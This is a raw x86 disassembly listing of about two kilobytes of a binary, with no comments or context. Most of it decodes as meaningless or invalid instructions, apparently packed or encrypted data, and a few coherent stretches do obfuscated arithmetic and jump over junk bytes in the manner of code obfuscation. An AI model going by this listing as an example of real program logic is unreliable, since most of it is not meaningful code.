  408500:	xchg   edx,eax
  408501:	xor    BYTE PTR [ebx+ecx*2],bh
  408504:	lds    ebx,FWORD PTR [ebp+0x58]
  408507:	jle    0x4084d9
  408509:	sbb    ebx,ecx
  40850b:	iret   
  40850c:	xor    ebp,DWORD PTR [eax]
  40850e:	mov    dl,0x22
  408510:	dec    eax
  408511:	call   0xd583:0x6f4a1db5
  408518:	rcr    DWORD PTR [edi],cl
  40851a:	xchg   edi,eax
  40851b:	and    DWORD PTR [edx-0x187060f4],eax
  408521:	ins    BYTE PTR es:[edi],dx
  408522:	test   al,0xbf
  408524:	mov    edi,0xa7575591
  408529:	mov    WORD PTR [eax+eiz*8-0x16],cs
  40852d:	jge    0x40858b
  40852f:	mov    ebp,0xf8c9c034
  408534:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408535:	xchg   ebp,eax
  408536:	cmp    al,0xc1
  408538:	in     eax,dx
  408539:	sub    BYTE PTR [ebp-0x2a],0xf
  40853d:	out    dx,al
  40853e:	sti    
  40853f:	mov    ds:0x18c15b47,eax
  408544:	inc    eax
  408545:	pop    ds
  408546:	fidiv  WORD PTR [ecx]
  408548:	dec    esi
  408549:	in     al,0x70
  40854b:	jmp    0x40853c
  40854d:	or     eax,0x2470071
  408552:	aam    0xb6
  408554:	dec    edx
  408555:	add    edx,esp
  408557:	xor    BYTE PTR [esi+0x1314daea],ah
  40855d:	in     al,dx
  40855e:	scas   eax,DWORD PTR es:[edi]
  40855f:	inc    ecx
  408560:	adc    BYTE PTR [eax],al
  408562:	jno    0x40854c
  408564:	cli    
  408565:	sbb    BYTE PTR [esi],bl
  408567:	dec    esp
  408568:	or     BYTE PTR [eax-0x26],bl
  40856b:	xchg   DWORD PTR [edi+0x23c16bdb],ecx
  408571:	dec    edx
  408572:	rcr    ebx,cl
  408574:	or     BYTE PTR [esi+0x23],ah
  408577:	inc    esi
  408578:	and    bl,BYTE PTR [esp+eax*4+0x5457b9d3]
  40857f:	shl    ah,1
  408581:	jge    0x408589
  408583:	stos   BYTE PTR es:[edi],al
  408584:	adc    ah,BYTE PTR [edi]
  408586:	arpl   WORD PTR [edi+0x142c038e],dx
  40858c:	sub    al,0xb9
  40858e:	repz mov bl,0x8b
  408591:	dec    ecx
  408592:	inc    DWORD PTR [edx]
  408594:	jmp    FWORD PTR [esi+0x76ff0c9]
  40859a:	or     BYTE PTR [ebp-0x5e2f290c],bl
  4085a0:	xchg   esp,eax
  4085a1:	cld    
  4085a2:	adc    al,0x57
  4085a4:	enter  0xc608,0xbb
  4085a8:	push   ss
  4085a9:	dec    edi
  4085aa:	push   cs
  4085ab:	icebp  
  4085ac:	ret    
  4085ad:	mov    eax,0x9e7b5b84
  4085b2:	shl    DWORD PTR [ecx+0x3da3241c],cl
  4085b8:	adc    al,0xd5
  4085ba:	stos   BYTE PTR es:[edi],al
  4085bb:	add    BYTE PTR [eax-0x38655f1e],al
  4085c1:	jl     0x40854f
  4085c3:	or     dh,bh
  4085c5:	mov    bh,0xee
  4085c7:	mov    al,0x21
  4085c9:	ret    0x5a89
  4085cc:	xor    al,0xd7
  4085ce:	ds int 0x67
  4085d1:	inc    eax
  4085d2:	and    dl,bl
  4085d4:	lods   al,BYTE PTR ds:[esi]
  4085d5:	mov    edx,0x7106df0f
  4085da:	pop    edi
  4085db:	stos   BYTE PTR es:[edi],al
  4085dc:	popf   
  4085dd:	outs   dx,BYTE PTR ds:[esi]
  4085de:	cmc    
  4085df:	or     al,0x66
  4085e1:	push   0x8541c5fd
  4085e6:	jns    0x408625
  4085e8:	xchg   edx,eax
  4085e9:	fwait
  4085ea:	push   ecx
  4085eb:	jb     0x408623
  4085ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4085ee:	lea    ecx,[esi]
  4085f0:	ret    0x96fb
  4085f3:	push   cs
  4085f4:	sar    DWORD PTR [eax+esi*4+0x3924d681],1
  4085fb:	xor    DWORD PTR ds:0x7c775f9b,0xfffffffe
  408602:	stc    
  408603:	inc    eax
  408604:	sar    DWORD PTR [ebx],cl
  408606:	jns    0x4085dc
  408608:	shl    DWORD PTR [esi-0x4b],cl
  40860b:	sub    ch,al
  40860d:	enter  0xd05f,0x87
  408611:	xchg   ebp,eax
  408612:	std    
  408613:	jmp    0x408599
  408615:	pushf  
  408616:	adc    al,BYTE PTR [ebp-0x57f4312a]
  40861c:	lock cwde 
  40861e:	sub    DWORD PTR [ecx+edi*4],ebp
  408621:	xchg   ch,bl
  408623:	out    dx,eax
  408624:	xchg   edx,eax
  408625:	(bad)  
  408626:	adc    BYTE PTR [esi],cl
  408628:	and    eax,0xc4360a59
  40862d:	imul   ecx,DWORD PTR [ebx],0xc4919185
  408633:	aam    0x3a
  408635:	aam    0x4f
  408637:	or     bh,ch
  408639:	push   cs
  40863a:	xchg   edx,eax
  40863b:	dec    ecx
  40863c:	popf   
  40863d:	inc    ebx
  40863e:	or     eax,0x9939650f
  408643:	pop    esi
  408644:	aas    
  408645:	fwait
  408646:	mov    edx,0x85fcd05b
  40864b:	cli    
  40864c:	and    DWORD PTR [edi+0x39c2b018],0x2181591e
  408656:	mov    dh,0xed
  408658:	pop    eax
  408659:	sti    
  40865a:	push   ebp
  40865b:	aaa    
  40865c:	mov    ebx,0x3e16c752
  408661:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408662:	push   ecx
  408663:	hlt    
  408664:	cmp    DWORD PTR ds:0xf0a38731,ecx
  40866a:	mov    cl,0xaa
  40866c:	pop    edx
  40866d:	stc    
  40866e:	cmp    al,0x65
  408670:	test   al,0x72
  408672:	mov    al,ds:0x32c7d25b
  408677:	cmp    bl,bh
  408679:	dec    edx
  40867a:	fnsave [esi-0x11]
  40867d:	dec    esp
  40867e:	aad    0xb4
  408680:	test   eax,0xcbfb32c
  408685:	sbb    BYTE PTR [ecx+edi*2-0x5d],dl
  408689:	rol    DWORD PTR [edi-0x71015021],0xe1
  408690:	pop    edx
  408691:	mov    eax,ds:0x173671bc
  408696:	fnstcw WORD PTR [edx+0x24]
  408699:	xor    BYTE PTR [ebx-0x71ed0148],bh
  40869f:	adc    DWORD PTR ds:0x433763,0x4336fb
  4086a9:	mov    DWORD PTR [ebp-0xc],ebx
  4086ac:	sbb    DWORD PTR ds:0x4337ef,0x433827
  4086b6:	jmp    0x4088fd
  4086bb:	pop    edi
  4086bc:	push   ebp
  4086bd:	jg     0x4086a0
  4086bf:	xor    eax,0xe8516171
  4086c4:	add    DWORD PTR [edx-0x1d6201b6],ecx
  4086ca:	adc    eax,0x7e7ed68a
  4086cf:	and    al,0x7c
  4086d1:	jle    0x408751
  4086d3:	sub    DWORD PTR [ecx-0x7b6e9929],ecx
  4086d9:	ins    BYTE PTR es:[edi],dx
  4086da:	pop    ss
  4086db:	fisubr WORD PTR [ebx+0x16]
  4086de:	sub    eax,0x1be3212b
  4086e3:	push   cs
  4086e4:	(bad)  
  4086e5:	cs call 0xd797:0xbb14559a
  4086ed:	jle    0x408763
  4086ef:	pop    ebp
  4086f0:	mov    ebx,0x5a3d5f31
  4086f5:	jno    0x4086e4
  4086f7:	push   ds
  4086f8:	sti    
  4086f9:	cmc    
  4086fa:	push   edx
  4086fb:	(bad)  
  4086fd:	test   DWORD PTR [ebx+0x57],ebp
  408700:	or     esi,DWORD PTR [edx+ebx*2+0x42]
  408704:	xor    BYTE PTR [edx+0x66a63579],0x40
  40870b:	ins    BYTE PTR es:[edi],dx
  40870c:	mov    ds,WORD PTR [ebp+0x7f]
  40870f:	sub    eax,0x516650d9
  408714:	imul   ebp,DWORD PTR [esi+0x1ac35d8f],0xfffffffe
  40871b:	shr    BYTE PTR [edx-0x12],cl
  40871e:	aaa    
  40871f:	push   ds
  408720:	mov    dl,0x35
  408722:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408723:	mov    esp,DWORD PTR [eax+esi*2]
  408726:	adc    edi,ebp
  408728:	xor    eax,0xbf8287af
  40872d:	rcr    BYTE PTR [edx+ebp*2],0xe6
  408731:	and    BYTE PTR [di+0x33],dh
  408735:	sub    BYTE PTR [edx],al
  408737:	test   DWORD PTR [edi+0x5e58e685],edi
  40873d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40873e:	test   eax,0x20a8bb97
  408743:	lahf   
  408744:	sti    
  408745:	test   al,0xe6
  408747:	dec    eax
  408748:	jmp    0xb1a6a3f0
  40874d:	jnp    0x408775
  40874f:	test   bl,ch
  408751:	es adc al,0xbb
  408754:	inc    esp
  408755:	cs test edx,edi
  408758:	repnz adc al,0xe8
  40875b:	push   edi
  40875c:	sar    DWORD PTR [ebx+0x1f],1
  40875f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408760:	jns    0x408771
  408762:	mov    ebp,0x5e1fa702
  408767:	pushf  
  408768:	jno    0x40872b
  40876a:	mov    edx,0x10386423
  40876f:	xchg   edx,eax
  408770:	pop    es
  408771:	cmp    ebp,ebx
  408773:	and    DWORD PTR [edi-0x5b7e2cd4],ecx
  408779:	cmc    
  40877a:	cwde   
  40877b:	fsubr  QWORD PTR [esi]
  40877d:	popf   
  40877e:	lods   eax,DWORD PTR ds:[esi]
  40877f:	xor    ebp,ebx
  408781:	inc    esi
  408782:	xlat   BYTE PTR ds:[ebx]
  408783:	jnp    0x40878d
  408785:	out    0x36,eax
  408787:	popf   
  408788:	jle    0x4087a6
  40878a:	mov    esp,0xbed443d0
  40878f:	outs   dx,BYTE PTR ds:[esi]
  408790:	sub    DWORD PTR [edx-0x13],edi
  408793:	adc    cl,dl
  408795:	or     BYTE PTR [eax],bh
  408797:	loopne 0x4087ee
  408799:	cmp    ebp,esi
  40879b:	mov    bh,0xd7
  40879d:	(bad)  
  40879e:	jl     0x408786
  4087a0:	ror    BYTE PTR [edi],cl
  4087a2:	nop
  4087a3:	xchg   ebx,eax
  4087a4:	cmp    bh,al
  4087a6:	inc    ebp
  4087a7:	inc    ebp
  4087a8:	cmp    BYTE PTR [edx+0x25],dl
  4087ab:	int    0xb5
  4087ad:	jmp    0xcc7ab964
  4087b2:	xor    BYTE PTR ds:0x50560626,al
  4087b8:	repnz out 0x67,ax
  4087bc:	int    0x32
  4087be:	pusha  
  4087bf:	popa   
  4087c0:	cmp    BYTE PTR [esi],al
  4087c2:	mov    edi,cs
  4087c4:	daa    
  4087c5:	ret    
  4087c6:	jo     0x408845
  4087c8:	adc    al,BYTE PTR [ecx-0x5f]
  4087cb:	je     0x40878c
  4087cd:	imul   bh
  4087cf:	sahf   
  4087d0:	(bad)  
  4087d1:	push   esi
  4087d2:	and    DWORD PTR [ecx-0x22],eax
  4087d5:	das    
  4087d6:	mov    DWORD PTR [edi-0x2e],ebp
  4087d9:	fsubr  QWORD PTR [eax]
  4087db:	sbb    al,0x7c
  4087dd:	mov    WORD PTR [ebp-0x4d],ss
  4087e0:	bnd jmp 0x1a49394c
  4087e6:	push   0x49
  4087e8:	ret    
  4087e9:	pop    ebp
  4087ea:	leave  
  4087eb:	or     eax,0x79c7379b
  4087f0:	mov    ah,BYTE PTR [eax+0x38480f5c]
  4087f6:	in     al,dx
  4087f7:	or     dl,ch
  4087f9:	sbb    BYTE PTR [ebx],bl
  4087fb:	in     al,0x7b
  4087fd:	adc    ah,BYTE PTR [edi]
  4087ff:	or     dh,BYTE PTR [ebx-0x5a2df078]
  408805:	cmc    
  408806:	popf   
  408807:	mov    al,ds:0xdee6ea4c
  40880c:	and    ebx,DWORD PTR [ebp+0x31]
  40880f:	in     al,0xf8
  408811:	stos   DWORD PTR es:[edi],eax
  408812:	pop    esi
  408813:	adc    eax,0x93da4b49
  408818:	scas   eax,DWORD PTR es:[edi]
  408819:	sub    BYTE PTR [edi-0x73b3bda6],al
  40881f:	push   esp
  408820:	xor    esi,edi
  408822:	xor    ecx,edi
  408824:	sub    edi,ecx
  408826:	cmp    al,BYTE PTR [ecx+eiz*8-0x36]
  40882a:	gs xor al,0x17
  40882d:	pop    edx
  40882e:	ins    DWORD PTR es:[edi],dx
  40882f:	xor    eax,0x4fa27b09
  408834:	fs in  eax,0xa3
  408837:	sub    BYTE PTR [esi],ah
  408839:	xchg   esp,eax
  40883a:	aad    0xd8
  40883c:	xor    bh,BYTE PTR [ebx-0x4ee53618]
  408842:	adc    DWORD PTR [ecx+0x6b],esi
  408845:	div    DWORD PTR [edi+0x1b4b0e3a]
  40884b:	fldcw  WORD PTR [ecx+ebx*4+0x4b0958a5]
  408852:	xor    cl,BYTE PTR [edi-0x3852b713]
  408858:	fisubr WORD PTR ds:0xab5d441e
  40885e:	adc    eax,0x6118d43a
  408863:	sahf   
  408864:	mov    dh,BYTE PTR [ebp+0x2831556d]
  40886a:	sub    esp,0xf43212a4
  408870:	fdivr  st(3),st
  408872:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408873:	pop    ecx
  408874:	int    0x9
  408876:	dec    dx
  408878:	jns    0x4088c8
  40887a:	outs   dx,BYTE PTR ds:[esi]
  40887b:	xchg   esi,eax
  40887c:	sub    BYTE PTR [ebp+0x5],bl
  40887f:	cmp    ah,BYTE PTR [ecx]
  408881:	jg     0x4088de
  408883:	jno    0x4088f5
  408885:	in     al,dx
  408886:	in     al,0x53
  408888:	repnz push edi
  40888a:	(bad)  
  40888b:	sub    al,0x71
  40888d:	and    eax,0x79b071f3
  408892:	mov    BYTE PTR [esi-0x2bbcda37],al
  408898:	pop    ecx
  408899:	out    0x72,eax
  40889b:	rcl    DWORD PTR [edx+0x62],1
  40889e:	into   
  40889f:	into   
  4088a0:	push   esp
  4088a1:	xor    DWORD PTR [ecx-0x18],edx
  4088a4:	sub    ch,BYTE PTR [ebp-0x60]
  4088a7:	xchg   edi,eax
  4088a8:	std    
  4088a9:	pop    ecx
  4088aa:	rcl    DWORD PTR [edx+0xe9d5c3e],0x1c
  4088b1:	imul   eax,ebp,0x46
  4088b4:	loope  0x408908
  4088b6:	cmp    DWORD PTR [esi],eax
  4088b8:	ret    0x96b0
  4088bb:	pop    ebx
  4088bc:	in     al,dx
  4088bd:	push   eax
  4088be:	push   ebp
  4088bf:	test   al,0xf4
  4088c1:	cmc    
  4088c2:	mov    ds:0x8b963c90,al
  4088c7:	dec    esp
  4088c8:	enter  0x4f1d,0x33
  4088cc:	fnstcw WORD PTR [edx]
  4088ce:	int    0xab
  4088d0:	pop    edx
  4088d1:	in     eax,dx
  4088d2:	rcr    dl,cl
  4088d4:	adc    al,0x6a
  4088d6:	adc    BYTE PTR [ebp+0x1c],dl
  4088d9:	add    DWORD PTR [edi],0x4a
  4088dc:	shr    DWORD PTR [esi-0x57],1
  4088df:	cmc    
  4088e0:	mov    ah,0xad
  4088e2:	retf   0xce5
  4088e5:	(bad)  
  4088e7:	sub    ebp,DWORD PTR [eax+0x22ff6a9e]
  4088ed:	mov    WORD PTR [edx],fs
  4088ef:	fdivr  DWORD PTR [eax]
  4088f1:	pop    edx
  4088f2:	mov    ebp,0xf19bf874
  4088f7:	loopne 0x408952
  4088f9:	js     0x4088fb
  4088fb:	aam    0x61
  4088fd:	mov    eax,DWORD PTR [eax]
  4088ff:	xor    DWORD PTR ds:0x433763,0x7c2a
  408909:	mov    cx,WORD PTR [ebp-0x4]
  40890d:	adc    DWORD PTR ds:0x4337db,0x67a8
  408917:	movzx  ecx,cx
  40891a:	xor    DWORD PTR ds:0x433753,0x1847
  408924:	add    ecx,DWORD PTR [eax]
  408926:	not    DWORD PTR ds:0x43371f
  40892c:	mov    DWORD PTR [ebp-0x18],ecx
  40892f:	mov    eax,DWORD PTR [ebp+0x8]
  408932:	or     DWORD PTR ds:0x433827,ebx
  408938:	mov    ecx,DWORD PTR [ebp-0x8]
  40893b:	xor    eax,esi
  40893d:	add    eax,edi
  40893f:	cmp    DWORD PTR [ecx],eax
  408941:	jne    0x408e5a
  408947:	dec    ecx
  408948:	mov    eax,DWORD PTR [ebp+0x8]
  40894b:	mov    ecx,DWORD PTR [ebp-0x18]
  40894e:	xor    eax,esi
  408950:	add    eax,edi
  408952:	cmp    DWORD PTR [ecx],eax
  408954:	jmp    0x408b9b
  408959:	stos   BYTE PTR es:[edi],al
  40895a:	adc    edx,esi
  40895c:	inc    ebx
  40895d:	jno    0x4089c0
  40895f:	stos   DWORD PTR es:[edi],eax
  408960:	icebp  
  408961:	jl     0x4089b5
  408963:	and    eax,0x9781452c
  408968:	sbb    dh,BYTE PTR [eax+0x247e7ed4]
  40896e:	jl     0x4089ee
  408970:	jle    0x408931
  408972:	dec    ebx
  408973:	ja     0x40895d
  408975:	jle    0x40895a
  408977:	call   0xf359:0x61aa6df8
  40897e:	aas    
  40897f:	sbb    bl,dl
  408981:	das    
  408982:	imul   DWORD PTR [eax+0x25e4c450]
  408988:	iret   
  408989:	cdq    
  40898a:	stc    
  40898b:	mov    ds:0x22def6fa,eax
  408990:	inc    ebx
  408991:	dec    eax
  408992:	mov    eax,0x788b37af
  408997:	scas   eax,DWORD PTR es:[edi]
  408998:	xchg   esi,eax
  408999:	jmp    0xf65e:0x815b12eb
  4089a0:	imul   edi,ebx,0x33
  4089a3:	inc    ebx
  4089a4:	jge    0x408a23
  4089a6:	inc    dl
  4089a8:	add    ebx,ecx
  4089aa:	sbb    dl,BYTE PTR [ebp+0x29]
  4089ad:	in     eax,dx
  4089ae:	stos   BYTE PTR es:[edi],al
  4089af:	lahf   
  4089b0:	jno    0x408935
  4089b2:	das    
  4089b3:	xchg   edi,eax
  4089b4:	adc    al,0xf6
  4089b6:	sub    ecx,ebp
  4089b8:	pop    ecx
  4089b9:	mov    eax,DWORD PTR ss:[ebx-0x4]
  4089bd:	sbb    DWORD PTR [ecx+0x64853347],esi
  4089c3:	je     0x40894d
  4089c5:	fisttp WORD PTR [edx-0x7549906e]
  4089cb:	and    al,0x26
  4089cd:	aad    0x7a
  4089cf:	imul   esp,ebx,0xe50a4142
  4089d5:	lods   al,BYTE PTR ds:[esi]
  4089d6:	je     0x4089f6
  4089d8:	popf   
  4089d9:	jge    0x40897a
  4089db:	mov    ch,0x5a
  4089dd:	push   ecx
  4089de:	idiv   DWORD PTR [esi-0x3dc4f9cd]
  4089e4:	into   
  4089e5:	mov    dh,0x82
  4089e7:	shl    DWORD PTR [esi-0x7ec9a27e],0x32
  4089ee:	xchg   ebx,eax
  4089ef:	pop    esp
  4089f0:	pop    ss
  4089f1:	xchg   ebp,eax
  4089f2:	xchg   edx,eax
  4089f3:	ins    DWORD PTR es:[edi],dx
  4089f4:	dec    edi
  4089f5:	xor    DWORD PTR [eax+0xc],esi
  4089f8:	mov    edx,0xadcb527
  4089fd:	jle    0x4089d3
  4089ff:	inc    ebp
  408a00:	push   edi
  408a01:	dec    edi
  408a02:	xchg   ebx,eax
  408a03:	mov    ecx,0x983dfc45
  408a08:	sub    al,0x37
  408a0a:	sbb    eax,0xd070438e
  408a0f:	inc    edi
  408a10:	jg     0x4089a7
  408a12:	and    DWORD PTR [eax],ecx
  408a14:	aam    0xf
  408a16:	push   edx
  408a17:	gs call 0xea2b:0x3e57dae8
  408a1f:	sbb    al,0x30
  408a21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408a22:	jg     0x408a0e
  408a24:	fadd   QWORD PTR [ebp-0x6b3cc261]
  408a2a:	out    dx,al
  408a2b:	push   ebp
  408a2c:	xchg   ebp,eax
  408a2d:	fsub   QWORD PTR [ebx+0x3532f6b]
  408a33:	test   DWORD PTR [edx+ecx*4],esi
  408a36:	mov    ebp,0xbc45a4fc
  408a3b:	(bad)  
  408a3c:	jmp    0xbb49:0xcc974f58
  408a43:	jg     0x408a8e
  408a45:	cmc    
  408a46:	fs out dx,al
  408a48:	ss scas al,BYTE PTR es:[edi]
  408a4a:	stos   DWORD PTR es:[edi],eax
  408a4b:	hlt    
  408a4c:	in     eax,dx
  408a4d:	scas   eax,DWORD PTR es:[edi]
  408a4e:	xchg   edx,eax
  408a4f:	aad    0xc2
  408a51:	mov    DWORD PTR [ecx],ebp
  408a53:	call   0xc053:0x534efe22
  408a5a:	sti    
  408a5b:	fnstcw WORD PTR [esp+edi*2-0x69]
  408a5f:	stos   BYTE PTR es:[edi],al
  408a60:	inc    edx
  408a61:	outs   dx,BYTE PTR ds:[esi]
  408a62:	dec    ecx
  408a63:	jg     0x408a17
  408a65:	stos   DWORD PTR es:[edi],eax
  408a66:	mov    DWORD PTR [ebp-0x49],esi
  408a69:	mov    ecx,DWORD PTR [eax]
  408a6b:	clc    
  408a6c:	mov    eax,0xb7d21f71
  408a71:	mov    ch,0x3b
  408a73:	ret    0xae89
  408a76:	jmp    0xb97b:0xf68719b5
  408a7d:	mov    bh,0x5c
  408a7f:	pop    edi
  408a80:	adc    al,BYTE PTR [ecx+edi*4-0x650cf4]
  408a87:	xor    eax,0x62a12e
  408a8c:	xchg   BYTE PTR [ebx],dh
  408a8e:	retf   0xa2ec
  408a91:	mov    DWORD PTR cs:[edx+0x6d967d79],esp
  408a98:	pusha  
  408a99:	test   ebp,0xaf6d9f14
  408a9f:	mov    al,0xa7
  408aa1:	xlat   BYTE PTR ds:[ebx]
  408aa2:	jmp    0x408ac0
  408aa4:	mov    dh,0xdc
  408aa6:	cmp    al,0x71
  408aa8:	pop    ebx
  408aa9:	or     ebx,DWORD PTR [eax-0x6]
  408aac:	popa   
  408aad:	popf   
  408aae:	adc    dl,cl
  408ab0:	adc    eax,0x4e2cf455
  408ab5:	inc    ebp
  408ab6:	(bad)
  408aba:	mov    al,0xcc
  408abc:	daa    
  408abd:	add    eax,0x99df91e7
  408ac2:	push   ds
  408ac3:	mov    bh,0x7c
  408ac5:	mov    dh,0x75
  408ac7:	jnp    0x408aee
  408ac9:	xchg   edi,eax
  408aca:	imul   esi,DWORD PTR [ebx+0x16b5c388],0xffffff97
  408ad1:	cmc    
  408ad2:	xlat   BYTE PTR ds:[ebx]
  408ad3:	add    dl,BYTE PTR [ebp-0x62e1078f]
  408ad9:	(bad)  
  408ada:	cmp    eax,0xa2038eb8
  408adf:	stos   DWORD PTR es:[edi],eax
  408ae0:	and    ebx,DWORD PTR [esi-0x5a]
  408ae3:	mov    ebp,0x6116c182
  408ae8:	out    dx,eax
  408ae9:	ins    DWORD PTR es:[edi],dx
  408aea:	mov    ebx,0x6edc336d
  408aef:	(bad)  
  408af1:	sub    BYTE PTR [ecx-0xe],bl
  408af4:	shl    BYTE PTR [eax+0x1a],0x84
  408af8:	in     al,0xa3
  408afa:	out    dx,al
  408afb:	cli    
  408afc:	pop    ebx
  408afd:	arpl   WORD PTR [eax+0x6f7819cc],sp
  408b03:	jbe    0x408acc
  408b05:	dec    ecx
  408b06:	cs out 0x80,eax
  408b09:	push   ebx
  408b0a:	mov    al,ds:0xc47e53df
  408b0f:	dec    esp
  408b10:	outs   dx,DWORD PTR ds:[esi]
  408b11:	xor    edx,0x68563ccb
  408b17:	pop    ebx
  408b18:	xor    dh,al
  408b1a:	ss sbb eax,0x8e889bb6
  408b20:	iret   
  408b21:	fistp  QWORD PTR [esi-0x2e]
  408b24:	sub    al,bl
  408b26:	cs sbb eax,0x23cc0f0c
  408b2c:	xchg   esp,eax
  408b2d:	(bad)  
  408b2e:	scas   eax,DWORD PTR es:[edi]
  408b2f:	int3   
  408b30:	out    0x81,eax
  408b32:	xchg   DWORD PTR [edi-0x4833eb3a],eax
  408b38:	add    BYTE PTR [esi+0x4c],0x39
  408b3c:	or     bl,cl
  408b3e:	nop
  408b3f:	jae    0x408ae4
  408b41:	cmp    ch,BYTE PTR [edx]
  408b43:	push   ds
  408b44:	repz mov edx,0xadac453f
  408b4a:	add    eax,0xc52dd993
  408b4f:	xchg   ebp,eax
  408b50:	repnz cmp al,0x64
  408b53:	stc    
  408b54:	pop    edx
  408b55:	and    al,0xc4
  408b57:	mov    ah,0xe6
  408b59:	pop    edx
  408b5a:	xchg   ebx,eax
  408b5b:	cmc    
  408b5c:	sub    ecx,ebx
  408b5e:	sbb    ecx,DWORD PTR [eax-0x3841f4b1]
  408b64:	sti    
  408b65:	add    ah,BYTE PTR [ebx]
  408b67:	addr16 mov ah,0xbe
  408b6a:	xor    DWORD PTR [edi+0x1a],ebp
  408b6d:	jns    0x408bd2
  408b6f:	test   DWORD PTR [esi-0x2abdc4c9],edx
  408b75:	popf   
  408b76:	es (bad) 
  408b79:	popf   
  408b7a:	and    DWORD PTR [edi-0x6362639e],0x44
  408b81:	pop    es
  408b82:	fst    st(3)
  408b84:	mov    ecx,0x4b964be0
  408b89:	mov    ecx,0x7f6b7ac5
  408b8e:	rcl    ch,cl
  408b90:	ss sub edx,eax
  408b93:	dec    edi
  408b94:	sbb    BYTE PTR [ebp-0x8],bl
  408b97:	div    cl
  408b99:	rcr    DWORD PTR [ecx+0x1d850f],0x0
  408ba0:	add    BYTE PTR [ebx+0x4d8b0845],cl
  408ba6:	lock xor eax,esi
  408ba9:	add    eax,edi
  408bab:	mov    DWORD PTR [ecx],eax
  408bad:	mov    eax,DWORD PTR [ebp-0x10]
  408bb0:	mov    ecx,DWORD PTR [ebp+0x10]
  408bb3:	xor    ecx,esi
  408bb5:	mov    edx,0xffcd8d65
  408bba:	sub    edx,ecx
  408bbc:	add    DWORD PTR [eax],edx
  408bbe:	mov    eax,ds:0x413c08
  408bc3:	mov    eax,DWORD PTR [eax]
  408bc5:	mov    cx,WORD PTR [ebp-0x4]
  408bc9:	movzx  ecx,cx
  408bcc:	add    ecx,DWORD PTR [eax]
  408bce:	mov    DWORD PTR [ebp-0x18],ecx
  408bd1:	mov    eax,DWORD PTR [ebp+0xc]
  408bd4:	mov    ecx,DWORD PTR [ebp+0xc]
  408bd7:	xor    eax,esi
  408bd9:	add    eax,eax
  408bdb:	xor    ecx,esi
  408bdd:	sub    ecx,eax
  408bdf:	jmp    0x408e26
  408be4:	xchg   ebx,eax
  408be5:	or     BYTE PTR [esi+0x73709572],cl
  408beb:	jmp    0x946e656d
  408bf0:	mov    dl,0xa4
  408bf2:	les    edi,FWORD PTR [esi+0x7e7ed266]
  408bf8:	and    al,0x7c
  408bfa:	jle    0x408c7a
  408bfc:	pop    ebp
  408bfd:	call   0x4a26:0x82f456c2
  408c04:	add    ah,BYTE PTR [esi]
  408c06:	cmp    BYTE PTR [esi-0x1e652e25],al
  408c0c:	xor    ah,BYTE PTR [eax-0x7a3e7e11]
  408c12:	fadd   DWORD PTR [eax+0x5e]
  408c15:	inc    ebx
  408c16:	jle    0x408c03
  408c18:	inc    eax
  408c19:	in     al,0x1
  408c1b:	dec    edx
  408c1c:	push   ebx
  408c1d:	xchg   edi,eax
  408c1e:	in     eax,dx
  408c1f:	mov    eax,ds:0x2751ac08
  408c24:	mov    eax,ds:0xcde14175
  408c29:	fistp  DWORD PTR [esi+0x6c757f3]
  408c2f:	mov    dh,0x1a
  408c31:	test   eax,0x23f27cc3
  408c36:	movq   mm2,QWORD PTR [eax+0x42cc0568]
  408c3d:	stos   BYTE PTR es:[edi],al
  408c3e:	dec    edx
  408c3f:	sbb    edx,DWORD PTR [edi-0x74]
  408c42:	pop    esp
  408c43:	pop    ecx
  408c44:	ret    0x701b
  408c47:	mov    al,ds:0xa3d3c81c
  408c4c:	push   esi
  408c4d:	add    esi,DWORD PTR [esi]
  408c4f:	jmp    0xa9d42d0a
  408c54:	sub    bl,0x1
  408c57:	mov    eax,edx
  408c59:	nop
  408c5a:	gs cld 
  408c5c:	ret    0x5f04
  408c5f:	dec    edi
  408c60:	xchg   BYTE PTR [ebp+0x4d],cl
  408c63:	ins    BYTE PTR es:[edi],dx
  408c64:	fwait
  408c65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408c66:	(bad)  [edi-0x1cf471af]
  408c6c:	dec    edx
  408c6d:	icebp  
  408c6e:	cmp    edx,edi
  408c70:	sti    
  408c71:	in     eax,dx
  408c72:	sub    esi,eax
  408c74:	in     eax,0x5c
  408c76:	or     eax,0xbbe20071
  408c7b:	xlat   BYTE PTR ds:[ebx]
  408c7c:	mul    DWORD PTR [ebp+0x17]
  408c7f:	repnz xchg esp,eax
  408c81:	test   BYTE PTR [esi],bl
  408c83:	pop    esp
  408c84:	repz sbb BYTE PTR [ebx-0x59668b75],bl
  408c8b:	aas    
  408c8c:	push   edi
  408c8d:	adc    al,0xbe
  408c8f:	or     BYTE PTR [ebx],bl
  408c91:	fisubr DWORD PTR [ebx-0x5a]
  408c94:	sahf   
  408c95:	xor    esi,eax
  408c97:	loopne 0x408cf0
  408c99:	shr    BYTE PTR [edi],0xfb
  408c9c:	clc    
  408c9d:	mov    edi,0x18165296
  408ca2:	mov    eax,ds
  408ca4:	sbb    DWORD PTR [esp+edi*2],esp
  408ca7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408ca8:	je     0x408ca4
  408caa:	sub    al,0xd3
  408cac:	and    al,0x8c
  408cae:	push   ss
  408caf:	mov    ebp,DWORD PTR [esi-0x53173111]
  408cb5:	inc    ecx
  408cb6:	sub    BYTE PTR [ecx-0x4cca789a],al
  408cbc:	jne    0x408c64
  408cbe:	inc    esp
  408cbf:	mov    ebx,0xaa32c32f
  408cc4:	test   BYTE PTR [esp+edx*1-0x2f],bh
  408cc8:	fcmovnbe st,st(4)
  408cca:	xchg   edi,eax
  408ccb:	add    DWORD PTR [edx],edx
  408ccd:	and    al,0x2f
  408ccf:	jge    0x408c81
  408cd1:	loop   0x408cda
  408cd3:	cmp    BYTE PTR [ebx],dl
  408cd5:	add    edx,esi
  408cd7:	and    DWORD PTR [edx+0x6],edi
  408cda:	add    al,0xdf
  408cdc:	in     eax,dx
  408cdd:	ficomp DWORD PTR [edi]
  408cdf:	int3   
  408ce0:	xlat   BYTE PTR ds:[ebx]
